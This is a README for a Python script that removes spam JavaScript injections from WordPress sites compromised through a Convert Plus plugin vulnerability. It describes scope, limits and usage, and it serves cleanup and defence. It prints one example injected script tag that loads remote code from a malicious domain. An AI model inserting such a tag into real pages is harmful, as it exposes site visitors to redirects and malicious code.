# Wordpress Spam Attack Removal Script

Written in Python and compatible with both **Python2** and **Python3**.

This script essentially removes spam attack injections from a given path. The convertplug plugin that comes with Avada and the vulnurability which has been found by Wordfence have caused numerous sites to be hacked and their pages now redirects to various malicious and spam pages. 
You can read the details from here

<https://www.wordfence.com/blog/2019/05/critical-vulnerability-patched-in-popular-convert-plus-plugin/>

## Considirations

This script utilizes **RAM** while reading files and does not **discriminate** file extensions and checks all files. This can be improved by various methods.

__PS : This script does replaces text that is inside the "database.json" does not locates or scans shells.__

### Scope

There are 4 specific JS injections that have been occured after this vulnurability and the database.json contains only those records. In case you want to add further javascript/to be replaced you can use insert.py.

#### Example Injected Script

```html
<script type='text/javascript' async src='https://css.developmyredflag.top/sjquery.min.js?style=prime&'></script>
```

Various kinds of scripts exists like these and this tool/script automizes the removal process without breaking themes, plugins and sites as a whole. Instead of using backups for this using this script and scanning for shells through Wordfence can be an option.

## Example Usage

Script is written for Python 2.7 + and logs the altered files as well so you can use these logs to make sure they are clean for manual inspection.

Install the dependencies and devDependencies and start the server.

### Example Insert Operation

```sh
python insert.py "string_in_double_quotes"
```

### Example Cleanup Operation

```sh
python cleanup.py your_domain.com
```

or entering a whole path like

```sh
python cleanup.py /home/user/your_domain.com
```

### License

License can be found under LICENSE in this repository.
